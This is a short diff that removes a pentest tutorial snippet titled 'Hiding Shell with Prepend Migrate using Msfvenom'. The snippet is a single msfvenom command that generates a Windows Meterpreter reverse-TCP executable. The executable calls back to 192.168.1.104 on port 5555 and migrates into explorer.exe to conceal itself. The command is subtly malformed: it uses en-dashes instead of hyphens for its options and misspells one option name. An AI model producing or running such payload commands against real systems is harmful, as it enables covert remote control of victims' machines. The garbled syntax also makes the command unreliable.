@@ -1,3 +1,0 @@
-Hiding Shell with Prepend Migrate using Msfvenom
-
-msfvenom –p windows/meterpreter/reverse_tcp lhost=192.168.1.104 lport=5555 prependmigrate=true prepenmigrateprocess=explorer.exe –f exe > /root/Desktop/raj.exe
